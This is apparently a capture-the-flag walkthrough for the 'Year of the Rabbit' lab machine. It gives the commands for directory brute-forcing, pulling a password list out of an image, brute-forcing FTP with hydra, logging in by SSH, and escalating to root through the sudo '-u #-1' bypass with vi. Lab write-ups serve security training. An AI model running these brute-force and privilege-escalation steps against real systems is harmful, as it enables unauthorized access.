# Year of the Rabbit

### **What is the user flag?**

```
nmap 10.10.74.247
```

![](<../../.gitbook/assets/Screenshot from 2020-09-22 08-31-07.png>)

#### http

```
gobuster dir -u http://10.10.74.247/ \
             -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -t64
curl http://10.10.74.247/sup3r_s3cr3t_fl4g.php
```

![](<../../.gitbook/assets/Screenshot from 2020-09-22 08-33-32.png>)

![](<../../.gitbook/assets/Screenshot from 2020-09-22 08-33-47.png>)

![](<../../.gitbook/assets/Screenshot from 2020-09-22 08-35-05.png>)

![](<../../.gitbook/assets/Screenshot from 2020-09-22 08-35-14.png>)

```
wget http://10.10.74.247/WExYY2Cv-qU/Hot_Babe.png
strings Hot_Babe.png
strings Hot_Babe.png | tail -82 > password.txt
hydra -l ftpuser -P password.txt ftp://10.10.74.247 -I -f -V -t64
```

![](<../../.gitbook/assets/Screenshot from 2020-09-22 08-39-00.png>)

#### ftp

```
lftp 10.10.74.247 -u ftpuser,5iez1wGXKfPKQ
lftp :/> cat Eli\'s_Creds.txt 
```

![](<../../.gitbook/assets/Screenshot from 2020-09-22 08-42-34.png>)

![](<../../.gitbook/assets/Screenshot from 2020-09-22 08-45-37.png>)

#### ssh

```
ssh ftpuser@10.10.74.247
find / -name user.txt 2>/dev/null
cat /home/gwendoline/user.txt
ls -l /home/gwendoline/user.txt
find / -name *s3cr3t* 2>/dev/null
cat /usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly\!
```

![](<../../.gitbook/assets/Screenshot from 2020-09-22 08-51-12.png>)

![](<../../.gitbook/assets/Screenshot from 2020-09-22 08-51-15.png>)

### **What is the root flag?**

```
sudo -l
sudo -u #-1 /usr/bin/vi /home/gwendoline/user.txt
:r /root/root.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-22 09-31-39.png>)

## :link: Support Material

{% embed url="https://cheatography.com/blacklist/cheat-sheets/linux-windows-privilege-escalation/" %}

